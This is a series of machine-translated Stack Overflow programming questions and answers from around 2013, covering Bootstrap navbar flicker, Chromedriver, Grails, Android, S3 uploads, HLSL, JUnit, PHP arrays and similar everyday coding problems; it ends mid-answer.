我最近将导航栏用作粘性导航栏，当我向下滚动到某个点后，它会粘附在页面顶部，但是，当我到达页面底部时，整个导航栏会闪烁，有时甚至会消失. 把它想象成一台会闪烁的旧电视，你最终会敲击侧面以停止闪烁。我将如何点击导航栏以阻止它闪烁。 [这](http://homegrowndevelopment.com/)是我的网站，因此您可以见证闪烁的所有荣耀。

这是我的导航 HTML：

```
<div id="nav-wrapper">
<div id="nav" class="navbar navbar-inverse affix-top" data-spy="affix">
  <div class="navbar-inner" data-spy="affix-top">
    <div class="container">

      <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
      <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </a>

      <!-- Everything you want hidden at 940px or less, place within here -->
      <div class="nav-collapse collapse">
        <ul class="nav">
            <li><a href="#home">Home</a></li>
            <li><a href="#service-top">Services</a></li>
            <li><a href="#contact-arrow">Contact</a></li>
        </ul><!--/.nav-->
      </div><!--/.nav-collapse collapse pull-right-->
    </div><!--/.container-->
  </div><!--/.navbar-inner-->
</div><!--/#nav /.navbar navbar-inverse-->
</div><!--/#nav-wrapper--> 
```

这是我的 JS：

```
<script>
    $(document).ready(function() {
        $('#nav-wrapper').height($("#nav").height());
        $('#nav').affix({
            offset: 675
        });
    });
</script> 
```

一个重要的注意事项应该是，这只是在我将 JS 中的偏移量从 更改为 之后才开始发生`offset: $('#nav').position()`的`offset: 675`。你可能会说，只要把它改回来，但使用旧的偏移量，我的粘性导航会过早地跳到顶部。

感谢您为我提供的任何帮助！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-05-14T12:28:36.297

你的网站现在对我来说看起来不错，但我被带到这里是为了寻找解决同样问题的方法，所以我想我会在这里添加我的经验。

我遇到的问题是，附加代码根据其在页面上的垂直位置将一个类（例如`affix`或）应用于附加元素。`affix-bottom`我将把这些称为“区域”。

如果新类的 CSS 使得它垂直移动附加元素，它可能会立即在*不同*的区域结束，因此该类被删除，所以它向后移动，所以该类被应用等等......因此位置与每个`onscroll`事件交替，并闪烁。

对我来说，关键是确保`data-offset-top`/`data-offset-bottom`值和 CSS 类被设置，以便在词缀切换时元素不再垂直移动。IE 类似：

```
<div class="someClass" data-spy="affix" data-offset-top="20" data-offset-bottom="300">
  ...
</div> 
```

（这`data-offset-bottom`是重新附加元素，这样它就不会撞到例如高脚下，并且并不总是必要的。）然后：

```
.someClass.affix {
  /* position: fixed; already applied in .affix */
  top: 10px;
  /* might also need e.g. width: 300px; as position: fixed; removes the element from its parent. */
}
.someClass.affix-bottom {
  position: absolute; /* Start scrolling again. */
  top: auto; /* Override the top position above. */
  bottom: 20px; /* It should stop near the bottom of its parent. */
} 
```

有时，当 CSS 类更改时的跳转会将元素进一步推*入*它正在进入的区域，这会导致边界处出现一次“轻弹”，但不会重复闪烁。

注意我认为当你的菜单变得固定时，非常轻微的跳跃可能会通过这种方式被平滑，通过在固定时对元素的垂直位置进行非常轻微的调整，和/或通过设置`data-offset-top`一些适当的值。

干杯，

狮子座

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-06-12T19:36:42.170

来自此[Bootstrap 3 Fixed Top Navbar 的答案...](https://stackoverflow.com/questions/21522527/bootstrap-3-fixed-top-navbar-flickering-on-mobile-scrolling-using-jquery-one-p)

只需将以下内容添加到 .navbar

```
.navbar
{
   -webkit-backface-visibility: hidden;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-19T14:28:02.730

我的问题是我的页面内容比我的菜单小，所以当菜单更改为固定位置时，它导致页面变窄。我用这个（咖啡脚本）设置内容最小高度：

```
$ ->
  $('.content').css('min-height', ->
    $('.bs-docs-sidebar').height()) 
```

一切都像一个魅力。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-07T10:26:10.443

只需将其添加到您的 CSS 类中。

```
.navbar-fixed-top, .navbar-fixed-bottom { position:unset; } 
```

# google-chrome - Chromedriver 无法启动或连接

> ID：14832626
> 
> 赞同：5
> 
> 时间：2013-02-12T12:30:59.947
> 
> 标签：google-chrome, watir-webdriver, selenium-chromedriver

直到今天，我一直在使用 chromedriver 来驱动我的 watir-webdriver 测试，我没有遇到任何问题。我的服务器仍然可以在相同版本的 chromedriver 和 chrome 上运行并运行测试。

我已经尝试更新到最新的 chromedriver，这是 chromedriver 2 实验版本。这失败了，因为我只能假设仍然有错误正在解决。我也尝试回滚到以前版本的 chromedriver，但没有成功。

如果有人对此有任何经验，我将非常感谢您的专业知识。我相信它会变成我忽略的一些简单的东西。

宝石版本：

```
watir-webdriver (0.6.2)
selenium-webdriver (2.29.0)
cucumber (1.2.1) 
```

从下面的 chromedriver 跟踪

```
Started ChromeDriver port=9517 version=26.0.1383.0
log=C:\Projects\oms_acceptance_tests\src\chromedriver.log
[6136:5300:0212/122320:ERROR:master_preferences.cc(110)] Failed to read master_preferences file at C:\Program Files (x86)\Google\Chrome\Application\master_preferences. Falling back to default preferences.

[6136:5300:0212/122320:ERROR:gpu_info_collector_win.cc(82)] Can't retrieve a valid WinSAT assessment.
test\automation\proxy_launcher.cc(107): error: Value of: app_launched
Actual: 5
Expected: AUTOMATION_SUCCESS
Which is: 0
Error while awaiting automation ping from browser process

[0212/122321:ERROR:proxy_launcher.cc(556)] Failed to ConnectToRunningBrowser

[0212/122321:ERROR:automation_proxy.cc(319)] Channel error in AutomationProxy.
Unable to either launch or connect to Chrome. Please check that ChromeDriver is up-to-date. Using Chrome binary at: C:\Program Files (x86)\Google\Chrome\Application\chrome.exe (Selenium::WebDriver::Error::UnknownError) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T20:36:13.543

我会尝试下载较新版本的[chromedriver](http://code.google.com/p/chromedriver/downloads/list)。当我遇到类似问题时为我工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-28T13:39:45.683

要摆脱 gpu winsat 错误，请尝试更新您的显示适配器。

# javascript - 将 click 元素与相应的隐藏项目 div 匹配

> ID：14832629
> 
> 赞同：-2
> 
> 时间：2013-02-12T12:31:12.723
> 
> 标签：javascript, html, jquery

我正在用 javascript 编写一个快速函数，它在一组帖子中与 wp 交互，当我单击与其匹配的 href="#element" 对应的元素时，这些帖子被隐藏并显示。

函数会像这样运行：

1）您单击其中一个动态添加的帖子标题，其中它的标签中有帖子标题的 href 值。

2）其下对应的隐藏项目，其id与上面动态添加的元素的href值相匹配，基本显示它并隐藏之前的子项目。

现在我尝试仅使用纯 javascript 来做到这一点，但它开始变得非常混乱和冗长。我想知道 jquery api 中是否有一个很好的工具来帮助解决这个问题？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:38:46.327

If I understand your question correctly, in jQuery you could:

```
<h1 class="buttonHeader" data-divider="#dividerId1">Test</h1>
<h1 class="buttonHeader" data-divider="#dividerId2">Test 2</h1>
<div class="myDivider" id="dividerId1"><p>Content</p></div> <!-- Not sure what href is used for? -->
<div class="myDivider" id="dividerId2"><p>Content 2</p></div>

$(document).ready(function() {
    $('h1.buttonHeader').click(function() {
        // Get data attribute from clicked header
        var correspondingDiv = $(this).attr('data-divider');
        // Hide any open 'myDivider' dividers
        $('.myDivider').hide();
        // Display the corresponding divider
        $(correspondingDiv).show();
    })
}) 
```

I don't really understand why you're using the href attribute.

Edit: [JSFiddle](http://jsfiddle.net/BBuaq/1/).

Edit: I've removed the loop as it wasn't necessary.

# grails - Grails域类约束修改导致异常

> ID：14832630
> 
> 赞同：1
> 
> 时间：2013-02-12T12:31:13.410
> 
> 标签：grails, grails-orm

我正在使用带有默认 h2 数据库的 grails 2.0.3 并具有以下用户域类：

```
class User {
    transient springSecurityService

    String username
    String password
    boolean enabled
    boolean accountExpired
    boolean accountLocked
    boolean passwordExpired

    Preferences preferences
    Company company
    Personal personal

    static constraints = {
        username    email: true, blank: false, unique: true
        password    blank: false
        preferences unique: true
        company     unique: true
        personal    unique: true
    }

    static mapping = {
        password column: '`password`'
    }

    Set<Role> getAuthorities() {
        UserRole.findAllByUser(this).collect { it.role } as Set
    }

    def beforeInsert() {
        encodePassword()
    }

    def beforeUpdate() {
        if (isDirty('password')) {
            encodePassword()
        }
    }

    protected void encodePassword() {
        password = springSecurityService.encodePassword(password)
    }
} 
```

在控制器中，我使用以下代码保存用户：

```
userInstance.save(flush: true) 
```

现在，今天下午，我意识到密码字段应该有一个大小约束，因此修改了域类，使其如下（仅更改在约束中）：

```
class User {
    transient springSecurityService

    String username
    String password
    boolean enabled
    boolean accountExpired
    boolean accountLocked
    boolean passwordExpired

    Preferences preferences
    Company company
    Personal personal

    static constraints = {
        username    email: true, blank: false, unique: true
        password    blank: false, size: 6..15
        preferences unique: true
        company     unique: true
        personal    unique: true
    }

    static mapping = {
        password column: '`password`'
    }

    Set<Role> getAuthorities() {
        UserRole.findAllByUser(this).collect { it.role } as Set
    }

    def beforeInsert() {
        encodePassword()
    }

    def beforeUpdate() {
        if (isDirty('password')) {
            encodePassword()
        }
    }

    protected void encodePassword() {
        password = springSecurityService.encodePassword(password)
    }
} 
```

随后我再次生成了视图和控制器。现在，当我尝试从控制器中保存用户对象时，使用：

```
userInstance.save(flush: true) 
```

我收到以下异常：

类：org.hibernate.AssertionFailure 消息：login.User 条目中的空 id（发生异常后不要刷新 Session）

任何帮助将不胜感激。

> 信息：如果我从新的/修改的类中删除大小约束，保存会很好。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2016-09-28T23:51:42.410

我在使用 Grails 3.1.12 时遇到了同样的问题。这就是我发现的以及我如何解决它的。

问题：

您正在尝试对将要进行编码的字段进行大小限制。这意味着像“admin5”这样的密码将在域生命周期结束时变成编码密码。例如，数据库将密码存储为：“$2a$10$dn7MyN.nsU8l05fMkL/rfek/d1odko9H4QUpiNp8USGhqx9g0R6om”。

验证过程会将大小约束应用于未编码的密码（域生命周期的验证步骤），因为用户输入的密码在该范围内，所以将通过。但是在 save() 方法（域生命周期的持久性步骤）上，密码将在插入或更新之前进行编码。enconding 方法将创建一个大小大于约束的 pwd，并且 Hibernate 将使 pwd 大小的 assert() 失败。

解决方案：

如果您不需要担心 maxSize，请使用 minSize 约束

```
 static constraints = {
    password    blank: false, minSize:6
} 
```

如果您需要验证 maxSize，那么我建议您在创建域实例之前对您的服务或控制器层进行验证。

# c - C函数：使用位旋转将2个数字相乘？

> ID：14832632
> 
> 赞同：-6
> 
> 时间：2013-02-12T12:31:19.263
> 
> 标签：c

我需要一些帮助来回答上述问题有什么好玩的想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:32:46.283

你会在这里得到更多：[Bit Twiddling Hacks](http://graphics.stanford.edu/~seander/bithacks.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:33:06.903

将其中一个输入视为位掩码。对于其中设置的每个位，您希望将另一个输入（左移那么多空格）添加到您的结果中。这假设无符号输入：非 2 补码有符号输入需要对符号位进行特殊处理。

我想我可以有把握地预测，这将比 CPU 的内置乘法运算效率低。

# css - 使用CSS选择dom元素选择包含大于X的数字的类名

> ID：14832635
> 
> 赞同：2
> 
> 时间：2013-02-12T12:31:26.607
> 
> 标签：css, attributes, css-selectors

我正在研究 css 属性选择器来尝试解决我的一个问题：

[https://developer.mozilla.org/en-US/docs/CSS/Attribute_selectors](https://developer.mozilla.org/en-US/docs/CSS/Attribute_selectors)

我有一堆 dom 元素，它们都根据它们在 json 层次结构中的深度进行分类（即使它们没有嵌套在 DOM 中）。所以 dom 可能看起来像这样：

```
<g class="node0">
<g class="node2">
<g class="node2">
<g class="node1">
<g class="node3"> 
```

我想编写一个选择器，它以具有 node2 或更高级别的 g 节点为目标。有没有办法用纯css做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:37:40.440

```
[class^=node]:not(.node0):not(.node1) {
   // styles here
} 
```

[**小提琴**](http://jsfiddle.net/8zfJS)

# android - 如何在 TabActivity 中重新启动活动

> ID：14832636
> 
> 赞同：0
> 
> 时间：2013-02-12T12:31:30.537
> 
> 标签：android

在我的应用程序中，我使用以下代码关闭并重新启动当前活动。但我的问题是，我使用了 3 个选项卡活动作为嵌套。共9个活动。因此，在使用以下代码时，我的应用加载速度太慢。我认为有比这更聪明的方法。有知道的朋友请推荐给我。

```
LocalActivityManager manager = getLocalActivityManager();
String currentTag = tab.getCurrentTabTag();             
Class<? extends Activity> currentClass = manager.getCurrentActivity().getClass();
manager.removeAllActivities();
manager.startActivity(currentTag, new Intent(MainActivity.this,currentClass)); 
```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:39:50.957

我想这里的“更聪明”的方式是不要使用不推荐使用的类`TabActivity`，并且肯定不要嵌套几个`TabHost`. 您可能应该`Fragments`至少使用[FragmentTabHost 之](https://developer.android.com/reference/android/support/v4/app/FragmentTabHost.html)类的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-09T07:44:40.487

```
INTENT.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP); 
```

此命令只是重新启动所有活动而没有任何问题。

# vb.net - 从 Windows 应用程序将文件上传到 S3 Amazon？

> ID：14832641
> 
> 赞同：0
> 
> 时间：2013-02-12T12:31:50.297
> 
> 标签：vb.net, amazon-web-services, amazon-s3

我是 Amazon S3 的新手，在搜索了 Amazon 和许多网站后，我取得了一些进展。

我正在从应用程序创建一个窗口来上传文件。我尝试使用以下代码，但它没有上传文件，我也没有收到任何错误。

如果我评论 .withKey 属性，则文件将上传到存储桶的根目录，但我想上传到文件夹中的特定文件夹。

```
Try
        Dim fileTransferUtility As New TransferUtility(client)
        Dim request As TransferUtilityUploadRequest = New TransferUtilityUploadRequest
        Dim S3_KEY As String = "MitsTest/CVs"  'I want to upload file to CVs folder

        With request
            .BucketName = "mybucketname"
            .WithKey(S3_KEY)
            .WithFilePath("C:\Users\mitesh\Desktop\s3.txt")
            .WithTimeout(FIVE_MINUTES)
        End With
        fileTransferUtility.Upload(request)

    Catch ex As Exception

    Finally

    End Try 
```

我也尝试过使用以下相同的结果，我没有收到任何错误，但文件没有上传。

```
Dim Filepath = "C:\Users\mitesh\Desktop\s3.txt"
Dim FolderName = "MitsTest/CVs/"
Dim PutRequest As New PutObjectRequest()

    Try
        With PutRequest
            .WithBucketName("mybucketname")
            '.WithKey(FolderName + "/" + FilePath)
            .WithKey(FolderName)
            .WithFilePath(FilePath)
            .StorageClass = S3StorageClass.Standard
            .ServerSideEncryptionMethod = ServerSideEncryptionMethod.None
            '.WithContentBody(String.Empty)
            Dim response As S3Response = client.PutObject(PutRequest)
            response.Dispose()

        End With

    Catch ex As Exception
        Stop
    End Try 
```

如果我取消注释此行 '.WithKey(FolderName + "/" + FilePath) 并从文件夹名称中删除正斜杠（/），然后我得到“我们计算的请求签名与您提供的签名不匹配。检查您的密钥和签约方式。” 错误。

我在这里错过了什么或做错了什么？任何帮助将非常感激。

问候

米特什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T00:57:10.393

您收到签名错误的原因是“C:\users..”中的反斜杠字符对于密钥名称无效。您应该将它们替换为正斜杠或为键名使用不同的值。

在您的第一个示例中，您实际上是在尝试上传到“MitsTest/CVs”键。您需要像这样附加文件的名称：

```
.WithKey(S3_KEY+ "/" + "s3.txt") 
```

# android - 手动完全重建钛项目

> ID：14832642
> 
> 赞同：0
> 
> 时间：2013-02-12T12:31:59.733
> 
> 标签：android, titanium, titanium-mobile, rebuild

```
Detected change in tiapp.xml, or assets deleted. Forcing full re-build... 
```

`tiapp.xml`在对文件进行一些更改以重新构建应用程序（即强制完全重新构建）之后，此行已从 Titan 构建的控制台中获取。是否可以手动完全重新构建钛应用程序。

**注意：**如果我们从项目菜单中清理项目，它不会重新构建

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T14:21:45.447

是的，您可以重新构建整个应用程序。只需删除项目中的 Built 文件夹。每次删除它都会重建。

# java - 找不到 assertThat

> ID：14832643
> 
> 赞同：0
> 
> 时间：2013-02-12T12:32:04.923
> 
> 标签：java, junit, hamcrest

这是我的代码

```
import org.junit.Test;

import static org.junit.Assert.assertThat;
import static sun.nio.cs.Surrogate.is;

public class PlayerTest {
  public void should_return_3_when_status_is_3(){
        Player player = new Player();
        assertThat(player.getStatus(),is(3));
    }
} 
```

这是痕迹

```
Can't find symbol
符号： method assertThat(int,boolean)
位置： class PlayerTest 
```

我的 iml 文件是

```
<?xml version="1.0" encoding="UTF-8"?>
<module type="JAVA_MODULE" version="4">
  <component name="NewModuleRootManager" inherit-compiler-output="true">
    <exclude-output />
    <content url="file://$MODULE_DIR$">
      <sourceFolder url="file://$MODULE_DIR$/src" isTestSource="false" />
      <sourceFolder url="file://$MODULE_DIR$/test" isTestSource="true" />
    </content>
    <orderEntry type="inheritedJdk" />
    <orderEntry type="sourceFolder" forTests="false" />
    <orderEntry type="module-library" scope="TEST">
      <library>
        <CLASSES>
          <root url="jar://$APPLICATION_HOME_DIR$/lib/junit-4.10.jar!/" />
        </CLASSES>
        <JAVADOC />
        <SOURCES />
      </library>
    </orderEntry>
  </component>
</module> 
```

我想我以前用过，但现在不行了。不知道该怎么做。但是 assertTrue 正在工作。正在使用 Ubuntu 11.04。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:52:56.273

错误在

```
import static sun.nio.cs.Surrogate.is; 
```

`is()`应该返回一个匹配器，但不管它是什么，它都会返回布尔值。尝试`org.hamcrest.Matchers.is`或`org.hamcrest.CoreMatchers.is`代替。

# ruby-on-rails-3 - 登录时设计不区分大小写的电子邮件

> ID：14832646
> 
> 赞同：0
> 
> 时间：2013-02-12T12:32:11.580
> 
> 标签：ruby-on-rails-3, devise

我正在使用 postgresql 设计将电子邮件存储在带有小写字母的 db 中：config.case_insensitive_keys = [ :email ]

但是当我使用大写的电子邮件登录时 - 我收到电子邮件错误的错误消息。我为此找到了解决方案，但这有1个麻烦：

```
def self.find_for_authentication(conditions = {})
    # Allow to log in with case insensitive email
    conditions[:email].downcase!
end 
```

1) 当我尝试使用错误的大写电子邮件登录时，我收到了错误，并且我的电子邮件使用了小写。（使用 AAA@bbb.CCC 登录，得到 aaa@bbb.ccc，但我需要显示 AAA@bbb.CCC）。我怎样才能改变这种行为？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T13:18:20.807

我不确定我是否理解您，但您应该能够访问您提供的原始电子邮件

条件[：电子邮件]

或者一旦登录，您可以通过 self.email 访问登录用户的电子邮件。

让我知道这是否有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T08:51:47.813

解决方案非常简单。您需要的只是在登录时复制参数哈希并在此哈希中更改电子邮件，但是当用户遇到异常时 - 我们只返回输入参数的原始哈希

```
def self.find_for_authentication(conditions = {})
  # Allow to log in with case insensitive email
  new_hash = conditions.dup
  new_hash[:email] = conditions[:email].downcase
  where(new_hash).first
end 
```

# java - Phonegap Android 应用程序：FileUploader 显示错误

> ID：14832649
> 
> 赞同：0
> 
> 时间：2013-02-12T12:32:16.123
> 
> 标签：java, android, cordova

我正在尝试将“ [FileUploader](https://github.com/phonegap/phonegap-plugins/tree/master/Android/FileUploader) ”集成到我的 android phonegap 应用程序中。

如上面的帖子所述，我将“FileUploader.java”复制到 com.beetight 中。

```
public class FileUploader extends Plugin { 
```

上面的行显示错误：“插件无法解析为类型”

```
@Override
public PluginResult execute(String action, JSONArray args, String callbackId) { 
```

代码显示错误：“FileUploader 类型的方法执行 (String JSONArray, String) 必须覆盖或实现超类型方法”。

我不知道如何解决这些错误。

请帮忙，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-26T16:09:53.773

随着更新的 PhoneGap/Cordova API，插件被弃用以扩展 API。您现在需要扩展“CordovaPlugin”，而不仅仅是“Plugin”

反过来，您现在也需要导入 org.apache.cordova.api.CordovaPlugin。

此外，需要重写的执行方法也有一个新的设置，它被称为

```
public boolean execute(String action, JSONArray data, CallbackContext callbackContext) { } 
```

所以它不再是 PluginResult 返回类型。

您需要导入一些额外的东西。我也遇到了同样的问题，但这篇博文对我帮助很大，我的自定义插件也能正常工作： [http ://simonmacdonald.blogspot.com/2013/06/why-dont-my-plugins-work- in-phonegap.html](http://simonmacdonald.blogspot.com/2013/06/why-dont-my-plugins-work-in-phonegap.html)

# php - Magento 错误：返回搜索中的所有产品

> ID：14832655
> 
> 赞同：0
> 
> 时间：2013-02-12T12:32:31.287
> 
> 标签：php, magento, magento-1.7

[http://ametrade.dev.icyberking.com](http://ametrade.dev.icyberking.com)

这是我的网站，我整天都在为我的搜索正常工作目前正在工作的是我搜索的任何内容它从网站返回所有产品无论您使用什么关键字，我也搜索过谷歌发现，使描述和简短描述不可搜索有助于使结果更精确，但这对我没有帮助，如果有人以前有过这种情况的经验，请分享

我正在使用磁电机 1.7 版本。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:46:56.770

好吧，在通过谷歌搜索更多之后，我找到了解决方案，我的问题转到文件 app\code\core\Mage\CatalogSearch\Block\

现在搜索这个方法 setListCollection()。

```
public function setListCollection()
{
//        $this->getListBlock()
//           ->setCollection($this->_getProductCollection());
return $this;
}

replace below code

public function setListCollection()
{
$this->getListBlock()
->setCollection($this->_getProductCollection());
return $this;
} 
```

这是实际的解决方案链接.... [http://developerview.wordpress.com/2012/08/08/magento-search-not-returning-expected-results/](http://developerview.wordpress.com/2012/08/08/magento-search-not-returning-expected-results/)

# shader - HLSL 点积返回意外结果

> ID：14832656
> 
> 赞同：1
> 
> 时间：2013-02-12T12:32:43.833
> 
> 标签：shader, hlsl

为了让大家不必浏览我的实际代码，我试图将我的问题简化为最简单的形式。使用 HLSL 提供的点函数时，我无法产生预期的结果。在我包含的示例中，我希望两个向量的点积为 26。当我运行此代码时，它将始终返回 45。我将此函数放在像素着色器中，并正在使用着色器模型 2 进行编译。求助！ ！！

浮动 MyDotProblemSimplified() {

```
float3 vectorOne = (1.0, 2.0, 3.0);
float3 vectorTwo = (3.0, 4.0, 5.0);
float dotResult = dot(vectorOne, vectorTwo); 
//Expected dotResult: 26
//Actual dotResult 45 
return dotResult; 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-14T20:50:09.487

以下来自另一个论坛：

问题是您定义 float3 的方式。

代替

```
float3 vectorOne = (1.0, 2.0, 3.0);
float3 vectorTwo = (3.0, 4.0, 5.0); 
```

和

```
float3 vectorOne = {1.0, 2.0, 3.0};
float3 vectorTwo = {3.0, 4.0, 5.0}; 
```

我不确定 () 符号的确切作用，但它似乎评估为三个中的最后一个值（然后将该值分配给向量的所有组件）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-10T18:27:14.943

`(1.0, 2.0, 3.0)`不是[hlsl](/questions/tagged/hlsl "显示标记为“hlsl”的问题")特定的表示法。相反，它是一个使用[逗号运算符](https://en.wikipedia.org/wiki/Comma_operator)的标量表达式。就像[c](/questions/tagged/c "显示标记为“c”的问题")和[c++](/questions/tagged/c%2b%2b "显示标记为“c++”的问题")一样，表达式是从左到右计算的，在这种情况下会产生值`3.0`This 用于`float3`从单个标量值构造 a ，并将该值复制到所有通道。

为了达到预期的效果，您的选择是：

```
// option 1:
float3 v = float3(x,y,z);

// option 2:
float3 v = {x,y,z};

// option 3:
float3 v;
v.x = x;
v.y = y;
v.z = z; 
```

# r - R - 在文件中执行一个函数

> ID：14832666
> 
> 赞同：0
> 
> 时间：2013-02-12T12:33:09.103
> 
> 标签：r

有一个 R 文件，其中有一个函数 getInfo() 。我想单独在那个脚本文件中运行这个函数。那可能吗 ？我知道在文件上运行脚本命令然后运行函数名会有所帮助。但是它也会从我不想要的脚本文件中运行其余的东西。在这里最好的出路是什么

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:57:11.270

当您`source`在脚本文件上使用时，该文件中的所有代码都将加载到当前活动的 R 会话中。任何不在函数中的代码都将被执行。我看到两个选项：

1.  将函数放在单独的源文件中，如果函数数量增加，甚至放在一个包中。
2.  设置全局 R 变量 using`option`并在要获取的文件中检索其值 using `getOption`，使非功能代码的执行依赖于此选项。这确实要求您在获取文件之前始终设置此选项，在您使用它的任何项目中。

我会选择选项1。

# c# - 有什么方法可以阻止我的 C# 应用程序尝试加载不存在的 .resources 文件？

> ID：14832669
> 
> 赞同：0
> 
> 时间：2013-02-12T12:33:17.073
> 
> 标签：c#, .net, wpf, windows, caliburn.micro

我正在编写一个 Caliburn.Micro 应用程序，我在其中从程序集中加载一个视图。调用运行良好，`Assembly.Load`但是当 Activator 尝试创建视图时，我`AssemblyResolve`启动然后失败：

```
ERROR - AssemblyResolve could not find StandardMenu.resources, Version=1.0.0.0, Culture=en-US, PublicKeyToken=null 
```

在程序集的项目设置中，我启用了“图标和清单”，而不是“资源文件”。

没有 StandardMenu.resources。它不存在，为什么要加载它？

# java - 从 Java 网页中读取文本

> ID：14832672
> 
> 赞同：0
> 
> 时间：2013-02-12T12:33:32.330
> 
> 标签：java, web-services, web-crawler, bufferedreader

我是 Java 新手，我正在尝试创建一个库来从 Web 服务中获取巴西地址，但我无法读取响应。

在类的构造函数中，我有这个`result`字符串，我想将响应附加到这个字符串中，一旦这个变量填充了响应，我就会知道该怎么做。

问题是：由于某种原因，我猜该`BufferedReader`对象不工作，所以没有响应被读取：/

这是代码：

```
package cepfacil;

import java.net.*;
import java.io.*;
import java.io.IOException;

public class CepFacil {
    final String baseUrl = "http://www.cepfacil.com.br/service/?filiacao=%s&cep=%s&formato=%s";
    private String zipCode, apiKey, state, addressType, city, neighborhood, street, status = "";

    public CepFacil(String zipCode, String apiKey) throws IOException {
        String line = "";

        try {
            URL apiUrl = new URL("http://www.cepfacil.com.br/service/?filiacao=" + apiKey + "&cep=" + 
                    CepFacil.parseZipCode(zipCode) + "&formato=texto");

            String result = "";

            BufferedReader in = new BufferedReader(new InputStreamReader(apiUrl.openStream()));

            while ((line = in.readLine()) != null) {
                result += line;
            }
            in.close();

            System.out.println(line);

        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        this.zipCode = zipCode;
        this.apiKey = apiKey;
        this.state = state;
        this.addressType = addressType;
        this.city = city;
        this.neighborhood = neighborhood;
        this.street = street;
    }
} 
```

所以这是代码应该如何工作的，你构建一个像这样的对象：

```
String zipCode = "53416-540";
String token = "0E2ACA03-FC7F-4E87-9046-A8C46637BA9D";

CepFacil address = new CepFacil(zipCode, token);

// so the apiUrl object string inside my class definition will look like this:
// http://www.cepfacil.com.br/service/?filiacao=0E2ACA03-FC7F-4E87-9046-A8C46637BA9D&cep=53416540&formato=texto
// which you can check, is a valid url with content in there 
```

为简洁起见，我省略了此代码的某些部分，但构造函数中调用的所有方法都在我的代码中定义，并且没有发生编译或运行时错误。

我很感激你能给我的任何帮助，我很想听听最简单的解决方案:)

提前致谢！

更新：现在我可以解决问题（@Uldz 向我指出问题的巨大道具）它是开源的[http://www.rodrigoalvesvieira.com/cepfacil/](http://www.rodrigoalvesvieira.com/cepfacil/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:52:14.583

在

```
System.out.println(line + "rodrigo"); 
```

你输出行而不是结果。也许最后一行是空的？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:46:29.113

可能有多种原因。包裹你`URL`的`HttpURLConnection`，这将帮助你查看响应代码和更多关于你从服务器获得的响应的信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:56:25.473

您可以/应该向 InputStreamReader 添加编码。然后结果不添加换行符。

```
 BufferedReader in = new BufferedReader(new InputStreamReader(apiUrl.openStream()));

        while ((line = in.readLine()) != null) {
            System.out.println("Line: " + line);
            String[] keyValue = line.split("\\s*=\\s*", 2);
            if (keyValue.length != 2) {
                System.err.println("*** Line: " + line);
                continue;
            }
            switch (keyValue[0]) {
                case "status":
                    status = keyValue[1];
                    break;
                ...
                default:
                    System.err.println("*** Key wrong: " + line);
            }
            result += line + "\n";
        }
        in.close(); 
```

# php - 嵌套数组到平面与 parent_id 创建

> ID：14832673
> 
> 赞同：0
> 
> 时间：2013-02-12T12:33:37.587
> 
> 标签：php, arrays, nested, parent, parentid

我想从嵌套数组创建平面数组，如下所示：

```
[0]=>Array(
  "id"=>1,
  "positions">Array(
    [0]=>Array(
      "id"=>2
      ),
    [1]=>Array(
      "id"=>3
      "positions"=>Array(
         [0]=>Array(
         "id"=>4
         )
      )
   ) 
```

像这样：

```
[0]=>Array(
  "id"=>1,
  "parent_id"=>0
  ),
[1]=>Array(
  "id"=>2,
  "parent_id"=>1
  ),
[2]=>Array(
  "id"=>3,
  "parent_id"=>1
  ),
[3]=>Array(
  "id"=>4,
  "parent_id"=>3
  ) 
```

我在嵌套结构中没有 parent_id，所以所有的技巧都是通过嵌套数组“骑行”，并根据父节点的 id 添加“parent_id”。我知道如何展平数组，但我需要 parent_id 信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:55:40.520

试试下面的代码：我希望它有用...

```
<?php

$array = array(array(
  "id"=>1,
  "positions" => 
    array(
       array(
         "id"=>2
       ),
       array(
          "id"=>3,
          "positions"=>
               array(
                  array(
                    "id"=>4
                  )
                )
        )
    )
  ));

echo "<pre>";
print_r(getArray($array));
echo "</pre>";
exit;

function getArray($array,$parent_id = 0)
{
    $result = array();
    foreach ($array as $value)
    {
        $tmp = array();
        $tmp['id'] = $value['id'];
        $tmp['parent_id'] = $parent_id;         
        $result[] = $tmp;
        if(!empty($value['positions']))
        {
            $result= array_merge($result,getArray($value['positions'],$value['id']));
        }

    }

    return $result;

}

?> 
```

输出 ：

```
Array
(
